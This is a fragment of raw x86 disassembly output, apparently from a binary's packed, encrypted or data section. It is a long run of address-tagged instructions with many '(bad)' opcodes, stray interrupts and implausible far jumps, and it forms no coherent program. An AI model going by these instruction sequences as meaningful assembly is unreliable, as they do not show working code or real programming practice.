  4229ef:	jo     0x422a61
  4229f1:	jo     0x42298d
  4229f3:	xor    esi,edi
  4229f5:	cwde   
  4229f6:	add    al,0xc
  4229f8:	add    BYTE PTR [ebp-0x80],bl
  4229fb:	xchg   DWORD PTR [eax-0x30522a80],eax
  422a01:	or     DWORD PTR [eax-0x75],ebx
  422a04:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  422a0b:	jecxz  0x4229f8
  422a0d:	hlt    
  422a0e:	scas   eax,DWORD PTR es:[edi]
  422a0f:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a16:	sub    dl,0xfa
  422a19:	iret   
  422a1a:	pop    eax
  422a1b:	iret   
  422a1c:	push   0xffffffcd
  422a1e:	out    0xfd,al
  422a20:	int    0x76
  422a22:	adc    DWORD PTR [ebx],esi
  422a24:	out    0x34,al
  422a26:	sub    ecx,ecx
  422a28:	or     dh,BYTE PTR [esi-0x43]
  422a2b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a31:	sub    BYTE PTR [edi],0x6
  422a34:	sub    DWORD PTR [eax-0x72357f80],eax
  422a3a:	cmc    
  422a3b:	sub    esp,esi
  422a3d:	in     eax,dx
  422a3e:	aad    0xe9
  422a40:	add    ebx,ebp
  422a42:	mov    bh,dh
  422a44:	fcmovnbe st,st(5)
  422a46:	out    dx,eax
  422a47:	pushf  
  422a48:	xchg   edi,edi
  422a4a:	test   al,0xcf
  422a4c:	fs adc ebx,0xffffffe9
  422a50:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a54:	iret   
  422a55:	int3   
  422a56:	call   0x80c2791f
  422a5b:	jno    0x4229f5
  422a5d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a67:	int    0xe6
  422a69:	std    
  422a6a:	xor    esp,esi
  422a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a6d:	das    
  422a6e:	pop    ecx
  422a6f:	push   0xffffffcd
  422a71:	(bad)  
  422a72:	or     eax,0xfcde9e3
  422a77:	sub    edi,eax
  422a79:	xchg   DWORD PTR [edi],ecx
  422a7b:	iret   
  422a7c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a82:	add    BYTE PTR [eax-0x102c8233],0x88
  422a89:	add    al,0xf2
  422a8b:	add    DWORD PTR [ebx+0x2],0x80818069
  422a92:	adc    dh,0x4e
  422a95:	inc    ebx
  422a96:	jns    0x422a1a
  422a98:	fldlg2 
  422a9a:	es int 0xc6
  422a9d:	or     eax,0x809221bd
  422aa2:	add    al,0x81
  422aa5:	mov    al,ds:0xfb87d287
  422aaa:	add    al,0xbd
  422aac:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422ab3:	jns    0x422a82
  422ab5:	ins    DWORD PTR es:[edi],dx
  422ab6:	and    ch,0xa0
  422ab9:	push   edx
  422aba:	add    al,0x3
  422abc:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422ac2:	push   edx
  422ac3:	add    al,0x3
  422ac5:	push   ebx
  422ac6:	mov    al,cl
  422ac8:	test   bh,bh
  422aca:	retf   
  422acb:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422ad3:	(bad)  
  422ad4:	in     al,dx
  422ad5:	outs   dx,DWORD PTR ds:[esi]
  422ad6:	rcl    bl,1
  422ad8:	(bad)  
  422ad9:	jge    0x422a98
  422adb:	outs   dx,DWORD PTR ds:[esi]
  422adc:	xchg   edx,eax
  422add:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422ae4:	sahf   
  422ae5:	mov    al,ds:0x3454009e
  422aea:	jno    0x422b4e
  422aec:	popa   
  422aed:	mov    ah,0x86
  422aef:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422af6:	push   cs
  422af7:	(bad)  
  422af8:	jge    0x422ab7
  422afa:	push   eax
  422afb:	xchg   edx,eax
  422afc:	add    BYTE PTR [eax+0x2d048d6],0xff
  422b03:	jge    0x422ac2
  422b05:	push   ss
  422b06:	xchg   edx,eax
  422b07:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422b0e:	ror    BYTE PTR [ecx+0x53d09282],1
  422b14:	jo     0x422ae3
  422b16:	(bad)  
  422b17:	std    
  422b18:	xor    edx,esi
  422b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b1b:	inc    ebx
  422b1c:	(bad)  
  422b1d:	xor    al,0x2f
  422b1f:	or     esp,ebx
  422b21:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b2b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b35:	int    0xd6
  422b37:	popf   
  422b38:	aam    0x23
  422b3a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b40:	or     ch,0xd6
  422b43:	xchg   ebp,eax
  422b44:	aam    0x89
  422b46:	int    0xd6
  422b48:	icebp  
  422b49:	int    0x8d
  422b4b:	xchg   ebp,eax
  422b4c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b52:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b58:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b5e:	pushf  
  422b5f:	stos   BYTE PTR es:[edi],al
  422b60:	sahf   
  422b61:	popa   
  422b62:	mov    esp,0xc180804a
  422b67:	mov    BYTE PTR [edi+0x649a62d9],al
  422b6d:	mov    ecx,edx
  422b6f:	rol    DWORD PTR [edx+0x70878492],cl
  422b75:	int    0xc6
  422b77:	or     eax,0x808169bd
  422b7c:	adc    dh,0x14
  422b7f:	int    0x76
  422b81:	mov    ebp,0xd30de6cd
  422b86:	lods   eax,DWORD PTR ds:[esi]
  422b87:	xchg   DWORD PTR [ebx],esi
  422b89:	retf   
  422b8a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422b91:	in     al,dx
  422b92:	push   esi
  422b93:	int    0xc6
  422b95:	or     eax,0xbd92c704
  422b9a:	daa    
  422b9b:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422ba5:	or     eax,0xc087add3
  422baa:	mov    BYTE PTR [esi-0x30577740],bl
  422bb0:	gs jp  0x422b37
  422bb3:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422bbd:	xchg   esi,esp
  422bbf:	or     eax,0x699e30c0
  422bc4:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422bcb:	xor    ebp,DWORD PTR [ebp+0x6c]
  422bce:	int    0x10
  422bd0:	mov    ebp,0x808081bc
  422bd5:	int    0x7d
  422bd7:	xor    ecx,DWORD PTR [edi]
  422bd9:	xor    ah,0x81
  422bdc:	lea    esi,[ebp-0x7b8a19fc]
  422be2:	das    
  422be3:	add    al,0xd0
  422be5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bec:	int    0x8d
  422bee:	mov    ch,0x4
  422bf0:	cli    
  422bf1:	test   BYTE PTR [edx-0x61783f79],al
  422bf7:	int    0xe6
  422bf9:	jge    0x422bce
  422bfb:	xacquire xchg BYTE PTR [ebx],dh
  422bfe:	ins    DWORD PTR es:[edi],dx
  422bff:	ins    BYTE PTR es:[edi],dx
  422c00:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422c05:	outs   dx,DWORD PTR ds:[esi]
  422c06:	lods   al,BYTE PTR ds:[esi]
  422c07:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422c0d:	inc    esp
  422c0e:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c18:	lea    edi,[ebp+0x4a58d0a]
  422c1e:	cli    
  422c1f:	test   BYTE PTR [edx+0x402cd77],al
  422c25:	mov    dh,0xa5
  422c27:	and    ebx,0xa58d04ef
  422c2d:	xchg   edx,eax
  422c2e:	mov    es,WORD PTR [edx+edi*8]
  422c31:	dec    esi
  422c32:	ja     0x422c52
  422c34:	pop    ebp
  422c35:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c3b:	int    0xf
  422c3d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c43:	jecxz  0x422bf2
  422c45:	xchg   DWORD PTR [esi+0x7d],esi
  422c48:	or     dh,BYTE PTR [esi+0xd]
  422c4b:	in     al,dx
  422c4c:	inc    esi
  422c4d:	add    al,0xef
  422c4f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c55:	jecxz  0x422c43
  422c57:	jecxz  0x422c0f
  422c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c5a:	pop    esi
  422c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5c:	lods   eax,DWORD PTR ds:[esi]
  422c5d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c64:	lods   eax,DWORD PTR ds:[esi]
  422c65:	mov    ss,esi
  422c67:	mov    ebp,0x8086745d
  422c6c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c73:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c79:	test   al,0x33
  422c7b:	add    BYTE PTR [edx-0x33],bh
  422c7e:	leave  
  422c7f:	int    0xc6
  422c81:	or     eax,0x808059bd
  422c86:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c8e:	jecxz  0x422c79
  422c90:	mov    ss,esi
  422c92:	in     eax,dx
  422c93:	in     al,dx
  422c94:	add    BYTE PTR [eax],0x76
  422c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c98:	int    0x8d
  422c9a:	mov    ch,0x4
  422c9c:	rcl    DWORD PTR [edx-0x32021933],cl
  422ca2:	leave  
  422ca3:	xor    esi,DWORD PTR [esi+0x34]
  422ca6:	pop    esi
  422ca7:	jbe    0x422c4e
  422ca9:	jnp    0x422c35
  422cab:	int    0xf8
  422cad:	xor    edx,esi
  422caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cb0:	int    0x96
  422cb2:	cmp    al,0x45
  422cb4:	inc    ecx
  422cb5:	inc    ebx
  422cb6:	add    esi,DWORD PTR [edi-0x79]
  422cb9:	jle    0x422c91
  422cbb:	clc    
  422cbc:	or     ah,dh
  422cbe:	std    
  422cbf:	das    
  422cc0:	pop    ecx
  422cc1:	adc    DWORD PTR [ebx-0x1a],eax
  422cc4:	cmp    al,0x2f
  422cc6:	or     esp,DWORD PTR [edx-0x2]
  422cc9:	add    BYTE PTR [eax],al
  422ccb:	mov    ebp,0x80808040
  422cd0:	xor    ebp,DWORD PTR [ebp-0x31]
  422cd3:	les    esi,FWORD PTR [esp+eiz*2]
  422cd6:	int    0x96
  422cd8:	sub    al,0xcd
  422cda:	(bad)  
  422cdb:	stc    
  422cdc:	xor    edx,esi
  422cde:	sbb    al,0xa
  422ce0:	inc    edx
  422ce1:	int    0x96
  422ce3:	inc    esp
  422ce4:	int    0xe6
  422ce6:	std    
  422ce7:	xor    esp,esi
  422ce9:	xor    al,0xa
  422ceb:	pusha  
  422cec:	retf   
  422ced:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422cf3:	test   al,0x9c
  422cf5:	xor    ebp,DWORD PTR [ebp+0x6c]
  422cf8:	in     al,dx
  422cf9:	popf   
  422cfa:	adc    bh,ah
  422cfc:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422d03:	shl    ebp,cl
  422d05:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422d0b:	(bad)  
  422d0c:	and    al,0x77
  422d0e:	mov    ch,0xcd
  422d10:	jbe    0x422cbf
  422d12:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d18:	lods   eax,DWORD PTR ds:[esi]
  422d19:	or     dl,dh
  422d1b:	stc    
  422d1c:	test   al,0xc5
  422d1e:	int    0x8d
  422d20:	jne    0x422d51
  422d22:	pop    ecx
  422d23:	ins    DWORD PTR es:[edi],dx
  422d24:	shl    edx,cl
  422d26:	test   BYTE PTR [edi-0x2c78428a],al
  422d2c:	in     al,dx
  422d2d:	xchg   BYTE PTR [edi],ch
  422d2f:	pop    ecx
  422d30:	ins    DWORD PTR es:[edi],dx
  422d31:	xchg   DWORD PTR [esi+0x75],esi
  422d34:	int    0xc6
  422d36:	jge    0x422d07
  422d38:	les    esi,FWORD PTR [esi-0x80]
  422d3b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d3e:	les    esi,FWORD PTR [esi-0x80]
  422d41:	adc    bh,ah
  422d43:	add    BYTE PTR [eax+0x24778180],0xcd
  422d4a:	mov    WORD PTR [esp+ebx*2],?
  422d4d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d54:	xor    al,0xa4
  422d56:	ja     0x422d7d
  422d58:	retf   0x31
  422d5b:	je     0x422d91
  422d5d:	pop    esp
  422d5e:	shl    ebp,cl
  422d60:	mov    BYTE PTR [ecx],cl
  422d62:	xchg   esp,eax
  422d63:	xor    al,0x2c
  422d65:	int    0xc
  422d67:	das    
  422d68:	mov    ebx,0xebd38096
  422d6d:	push   ebx
  422d6e:	das    
  422d6f:	rcl    DWORD PTR [ebx],1
  422d71:	pop    esi
  422d72:	mov    WORD PTR [esp+ebp*1],?
  422d75:	ja     0x422d91
  422d77:	int    0xdb
  422d79:	pop    edi
  422d7a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d81:	jmp    0x422d08
  422d83:	mov    eax,0x87808d81
  422d88:	ins    DWORD PTR es:[edi],dx
  422d89:	iret   
  422d8a:	les    esi,FWORD PTR [esp+ebp*2]
  422d8d:	(bad)
  422d90:	test   DWORD PTR [esi],edi
  422d92:	mov    WORD PTR [esp+ebp*1],?
  422d95:	xor    ebx,ebx
  422d97:	mov    eax,0x8780963e
  422d9c:	ins    DWORD PTR es:[edi],dx
  422d9d:	add    al,0x6d
  422d9f:	or     edi,0xc56c34c4
  422da5:	cwde   
  422da6:	int    0xf0
  422da8:	mov    ebp,0xfcd9
  422dad:	int    0xd9
  422daf:	int    0xf
  422db1:	jns    0x422d39
  422db3:	mov    bh,0xbd
  422db5:	sub    esp,edi
  422db7:	add    BYTE PTR [eax],al
  422db9:	cwde   
  422dba:	int    0xf0
  422dbc:	jns    0x422e36
  422dbe:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422dc4:	add    BYTE PTR [eax-0x58798787],bl
  422dca:	mov    ebp,0xfc38
  422dcf:	jns    0x422e49
  422dd1:	xchg   edx,eax
  422dd2:	cmp    eax,0xeceb99cd
  422dd7:	add    eax,DWORD PTR [eax]
  422dd9:	add    BYTE PTR [esi-0x12ed1233],dl
  422ddf:	inc    esp
  422de0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422dea:	leave  
  422deb:	jbe    0x422da2
  422ded:	inc    ecx
  422dee:	and    DWORD PTR [esi-0x778932cb],eax
  422df4:	or     dh,BYTE PTR [esi-0x78]
  422df7:	int    0x76
  422df9:	stc    
  422dfa:	int    0x96
  422dfc:	stc    
  422dfd:	pop    ebx
  422dfe:	cwde   
  422dff:	call   0xd3e3:0x3b9effc0
  422e06:	jmp    0x3586:0x21d1bf28
  422e0d:	cmp    eax,ebp
  422e0f:	sar    DWORD PTR [ebp+0xad25392],cl
  422e15:	jbe    0x422e8c
  422e17:	int    0x76
  422e19:	stc    
  422e1a:	int    0x96
  422e1c:	stc    
  422e1d:	cmp    eax,ebp
  422e1f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e25:	jmp    0xfd76:0xad25328
  422e2c:	int    0x76
  422e2e:	stc    
  422e2f:	int    0x96
  422e31:	stc    
  422e32:	cmp    eax,ebp
  422e34:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e3a:	jmp    0xd076:0xad25328
  422e41:	int    0x76
  422e43:	stc    
  422e44:	int    0x96
  422e46:	stc    
  422e47:	cmp    eax,ebp
  422e49:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e4f:	jmp    0xbd76:0xad25328
  422e56:	leave  
  422e57:	jbe    0x422e86
  422e59:	dec    ecx
  422e5a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e61:	mov    al,ds:0x76c93586
  422e66:	and    eax,0x35862169
  422e6b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e6f:	jbe    0x422e41
  422e71:	or     dh,BYTE PTR [esi-0x30]
  422e74:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e7c:	ror    cl,1
  422e7e:	jbe    0x422e50
  422e80:	jo     0x422e02
  422e82:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e89:	add    BYTE PTR [eax-0x32068933],0x96
  422e90:	stc    
  422e91:	cmp    eax,ebp
  422e93:	cmp    esp,ebx
  422e95:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e9b:	push   ebx
  422e9c:	ror    BYTE PTR [edx],cl
  422e9e:	jbe    0x422e70
  422ea0:	int    0x76
  422ea2:	stc    
  422ea3:	int    0x96
  422ea5:	stc    
  422ea6:	cmp    eax,ebp
  422ea8:	cmp    esp,ebx
  422eaa:	sar    DWORD PTR [ebp+0x28ead392],cl
  422eb0:	push   ebx
  422eb1:	ror    BYTE PTR [edx],cl
  422eb3:	jbe    0x422e85
  422eb5:	leave  
  422eb6:	jbe    0x422e4d
  422eb8:	arpl   WORD PTR [edx+0x76c98080],dx
  422ebe:	lods   eax,DWORD PTR ds:[esi]
  422ebf:	pop    esi
  422ec0:	add    BYTE PTR [eax+0xd76c980],0xe6
  422ec7:	add    BYTE PTR [eax-0xa983080],0xff
  422ece:	add    BYTE PTR [eax],al
  422ed0:	iret   
  422ed1:	push   edi
  422ed2:	xchg   ebp,eax
  422ed3:	inc    DWORD PTR [eax]
  422ed5:	add    BYTE PTR [ebp+0xff13],bh
  422edb:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ee1:	lea    ebp,[ebp-0x72ff562a]
  422ee7:	xchg   ebp,eax
  422ee8:	(bad)  
  422ee9:	fcmove st,st(1)
  422eeb:	jbe    0x422e9a
  422eed:	dec    esi
  422eee:	ins    BYTE PTR es:[edi],dx
  422eef:	add    BYTE PTR [eax-0x32068933],0x8d
  422ef6:	stc    
  422ef7:	cmp    eax,ebp
  422ef9:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422eff:	cmp    ecx,DWORD PTR [edi]
  422f01:	shl    edx,cl
  422f03:	sub    BYTE PTR [ebx-0x2d],dl
  422f06:	or     dh,BYTE PTR [esi+0x6d]
  422f09:	int    0x76
  422f0b:	stc    
  422f0c:	int    0x8d
  422f0e:	stc    
  422f0f:	add    al,0xb6
  422f11:	cmc    
  422f12:	cmp    BYTE PTR [ebx],0xc5
  422f15:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f1b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f1f:	or     dh,BYTE PTR [esi-0x6b]
  422f22:	mov    ah,0xb1
  422f24:	sbb    al,0x80
  422f26:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f2d:	push   eax
  422f2e:	or     dh,BYTE PTR [esi-0x13]
  422f31:	int    0x6c
  422f33:	dec    esp
  422f34:	or     dh,BYTE PTR [esi+0x11]
  422f37:	int    0x76
  422f39:	mov    bh,cl
  422f3b:	(bad)  
  422f3c:	cmc    
  422f3d:	or     cl,BYTE PTR [ecx]
  422f3f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f45:	mov    bh,cl
  422f47:	(bad)  
  422f48:	in     eax,dx
  422f49:	or     cl,BYTE PTR [ecx]
  422f4b:	push   ebp
  422f4c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f56:	lea    edx,[ecx]
  422f58:	or     cl,BYTE PTR [ecx]
  422f5a:	pop    ebp
  422f5b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f65:	stc    
  422f66:	int    0x96
  422f68:	stc    
  422f69:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f6c:	cdq    
  422f6d:	shr    ebx,cl
  422f6f:	xchg   edx,eax
  422f70:	shr    edx,cl
  422f72:	sub    BYTE PTR [ebx+0x13],dl
  422f75:	inc    ebx
  422f76:	jge    0x422fa7
  422f78:	add    eax,0x808087ca
  422f7d:	int    0x76
  422f7f:	mov    ch,cl
  422f81:	add    DWORD PTR ds:0xcd808081,esi
  422f87:	mov    ch,cl
  422f89:	jbe    0x422f13
  422f8b:	int    0x1
  422f8d:	xor    eax,0xcd808081
  422f92:	add    BYTE PTR [edi-0x72329b92],0x88
  422f99:	int    0xa
  422f9b:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422fa1:	adc    al,0x0
  422fa3:	add    BYTE PTR [eax],al
  422fa5:	(bad)  
  422fa6:	int    0x96
  422fa8:	mov    ch,cl
  422faa:	mov    ds:0x80808125,al
  422faf:	int    0x22
  422fb1:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422fb7:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422fbf:	bound  eax,QWORD PTR [eax]
  422fc1:	jno    0x422fe7
  422fc3:	cmp    ebp,DWORD PTR [ebp-0x37]
  422fc6:	push   es
  422fc7:	push   esp
  422fc8:	add    BYTE PTR [eax],al
  422fca:	add    BYTE PTR [esi],cl
  422fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fcd:	aad    0x49
  422fcf:	leave  
  422fd0:	push   es
  422fd1:	pop    esp
  422fd2:	add    BYTE PTR [eax],al
  422fd4:	add    BYTE PTR [edi+0x35],dl
  422fd7:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422fdd:	add    BYTE PTR [eax],al
  422fdf:	mov    ds:0x79d735c1,eax
  422fe4:	push   es
  422fe5:	ins    BYTE PTR es:[edi],dx
  422fe6:	add    BYTE PTR [eax],al
  422fe8:	add    BYTE PTR [eax],bl
  422fea:	iret   
  422feb:	outs   dx,BYTE PTR ds:[si]
  422fed:	add    BYTE PTR [eax],al
  422fef:	add    BYTE PTR [edi+0x3b41afb8],ch
  422ff5:	ins    DWORD PTR es:[edi],dx
  422ff6:	leave  
  422ff7:	push   es
  422ff8:	sub    al,0x0
  422ffa:	add    BYTE PTR [eax],al
  422ffc:	push   cs
  422ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ffe:	aad    0x49
  423000:	leave  
  423001:	push   es
  423002:	xor    al,0x0
  423004:	add    BYTE PTR [eax],al
  423006:	push   edi
  423007:	xor    eax,0x6c9ab13
  42300c:	cmp    al,0x0
  42300e:	add    BYTE PTR [eax],al
  423010:	mov    ds:0x79c335c1,eax
  423015:	push   es
  423016:	inc    esp
  423017:	add    BYTE PTR [eax],al
  423019:	add    BYTE PTR [eax],bl
  42301b:	iret   
  42301c:	addr16 inc esi
  42301e:	add    BYTE PTR [eax],al
  423020:	add    BYTE PTR [edi-0x32be5048],ch
  423026:	jbe    0x422fb0
  423028:	int    0x1
  42302a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423030:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423037:	int    0x76
  423039:	mov    ch,cl
  42303b:	add    DWORD PTR [ebp-0x7f],edi
  42303e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423045:	mov    dl,0x35
  423047:	leave  
  423048:	jbe    0x42304f
  42304a:	mov    bh,0x3f
  42304c:	cmp    DWORD PTR [edi-0x48],eax
  42304f:	leave  
  423050:	jbe    0x42305b
  423052:	xlat   BYTE PTR ds:[ebx]
  423053:	sbb    cl,cl
  423055:	push   es
  423056:	les    eax,FWORD PTR [eax]
  423058:	add    BYTE PTR [eax],al
  42305a:	push   cs
  42305b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42305c:	aad    0x49
  42305e:	leave  
  42305f:	push   es
  423060:	nop
  423061:	add    BYTE PTR [eax],al
  423063:	add    BYTE PTR [edi+0x35],dl
  423066:	xlat   BYTE PTR ds:[ebx]
  423067:	inc    ecx
  423068:	leave  
  423069:	push   es
  42306a:	aam    0x0
  42306c:	add    BYTE PTR [eax],al
  42306e:	cmp    DWORD PTR [ecx+0x57],ecx
  423071:	jge    0x42303c
  423073:	push   es
  423074:	fadd   QWORD PTR [eax]
  423076:	add    BYTE PTR [eax],al
  423078:	mov    cl,0x3f
  42307a:	shl    DWORD PTR ds:0xe406c9,0x0
  423081:	add    BYTE PTR [edi-0x49],al
  423084:	xlat   BYTE PTR ds:[ebx]
  423085:	sbb    cl,cl
  423087:	push   es
  423088:	pushf  
  423089:	add    BYTE PTR [eax],al
  42308b:	add    BYTE PTR [esi],cl
  42308d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42308e:	aad    0x49
  423090:	leave  
  423091:	push   es
  423092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423093:	add    BYTE PTR [eax],al
  423095:	add    BYTE PTR [edi+0x35],dl
  423098:	xlat   BYTE PTR ds:[ebx]
  423099:	inc    ecx
  42309a:	leave  
  42309b:	push   es
  42309c:	lods   al,BYTE PTR ds:[esi]
  42309d:	add    BYTE PTR [eax],al
  42309f:	add    BYTE PTR [ecx],bh
  4230a1:	dec    ecx
  4230a2:	push   edi
  4230a3:	jge    0x42306e
  4230a5:	push   es
  4230a6:	mov    ah,0x0
  4230a8:	add    BYTE PTR [eax],al
  4230aa:	mov    cl,0x3f
  4230ac:	shl    DWORD PTR ds:0xbc06c9,0x0
  4230b3:	add    BYTE PTR [edi-0x49],al
  4230b6:	ret    
  4230b7:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  4230bd:	jo     0x42308c
  4230bf:	jbe    0x4230f6
  4230c1:	add    BYTE PTR [eax],dh
  4230c3:	int    0x76
  4230c5:	stc    
  4230c6:	int    0x8d
  4230c8:	stc    
  4230c9:	cmp    eax,ebp
  4230cb:	cmp    ecx,DWORD PTR [edi]
  4230cd:	shl    edx,cl
  4230cf:	sub    bl,dl
  4230d1:	mov    ebp,0xcdd35392
  4230d6:	lea    ebp,[ebp+0x52fd343]
  4230dc:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230e3:	int    0x8d
  4230e5:	mov    ch,0x3b
  4230e7:	lds    edi,FWORD PTR [ebx]
  4230e9:	psrlq  mm6,mm2
  4230ec:	sub    bl,dl
  4230ee:	mov    ebp,0xcdd35392
  4230f3:	lea    ebp,[ebp+0x76cd7d33]
  4230f9:	ins    DWORD PTR es:[edi],dx
  4230fa:	inc    ebx
  4230fb:	shr    DWORD PTR [edi],cl
  4230fd:	or     ch,dl
  4230ff:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  423109:	int    0x76
  42310b:	mov    ch,cl
  42310d:	rcl    BYTE PTR [ecx],1
  42310f:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423119:	add    DWORD PTR [ebp-0x7f],esi
  42311c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423123:	jo     0x423125
  423125:	cwde   
  423126:	xor    ch,cl
  423128:	lea    ecx,[eax-0x7ebaf533]
  42312e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423135:	int    0x5d
  423137:	adc    DWORD PTR [ecx-0x29327f80],eax
  42313d:	mov    BYTE PTR [ebx],bh
  42313f:	ins    DWORD PTR es:[edi],dx
  423140:	iret   
  423141:	pop    ss
  423142:	pushf  
  423143:	add    BYTE PTR [eax],al
  423145:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42314b:	jo     0x42311a
  42314d:	jbe    0x4230d7
  42314f:	int    0x1
  423151:	inc    ebp
  423152:	add    DWORD PTR [eax+0x500080],0x760a889a
  42315c:	adc    eax,0xcd8876cd
  423161:	pop    ebp
  423162:	adc    DWORD PTR [ecx-0x29327f80],eax
  423168:	mov    BYTE PTR [ebx],bh
  42316a:	ins    DWORD PTR es:[edi],dx
  42316b:	iret   
  42316c:	pop    ss
  42316d:	les    eax,FWORD PTR [eax]
  42316f:	add    BYTE PTR [eax],al
  423171:	mov    ebp,0x80803ad9
  423176:	jo     0x423145
  423178:	jbe    0x423102
  42317a:	int    0x1
  42317c:	inc    ebp
  42317d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423187:	mov    ch,cl
  423189:	pop    ebp
  42318a:	adc    DWORD PTR [ecx-0x29327f80],eax
  423190:	mov    BYTE PTR [ebx],bh
  423192:	ins    DWORD PTR es:[edi],dx
  423193:	iret   
  423194:	pop    ss
  423195:	push   esp
  423196:	add    BYTE PTR [eax],al
  423198:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  42319e:	jo     0x42316d
  4231a0:	jbe    0x42312a
  4231a2:	int    0x1
  4231a4:	inc    ebp
  4231a5:	add    DWORD PTR [eax+0x500080],0xb604889a
  4231af:	pop    ebp
  4231b0:	or     BYTE PTR [edx],0x76
  4231b3:	xor    eax,0xc05d76cd
  4231b8:	push   ds
  4231b9:	cmp    ebx,edx
  4231bb:	sahf   
  4231bc:	clc    
  4231bd:	add    al,BYTE PTR [ecx]
  4231bf:	shr    BYTE PTR [esi+0x2f],cl
  4231c2:	pop    ecx
  4231c3:	shl    BYTE PTR [eax+0x0],cl
  4231c6:	xchg   esi,eax
  4231c7:	xor    eax,0x43d66d06
  4231cc:	int    0x76
  4231ce:	pop    ebp
  4231cf:	add    al,0xad
  4231d1:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  4231d8:	adc    eax,0x40d46d06
  4231dd:	int    0x76
  4231df:	mov    ch,cl
  4231e1:	pop    ebp
  4231e2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231e8:	mov    BYTE PTR [ebx],bh
  4231ea:	ins    DWORD PTR es:[edi],dx
  4231eb:	iret   
  4231ec:	xchg   esi,eax
  4231ed:	add    DWORD PTR [ebp-0x7f7fc560],edi
  4231f3:	jo     0x4231c2
  4231f5:	jbe    0x42317f
  4231f7:	int    0x1
  4231f9:	cmp    eax,0x808081
  4231fe:	push   eax
  4231ff:	add    BYTE PTR [edx+0xd760a88],bl
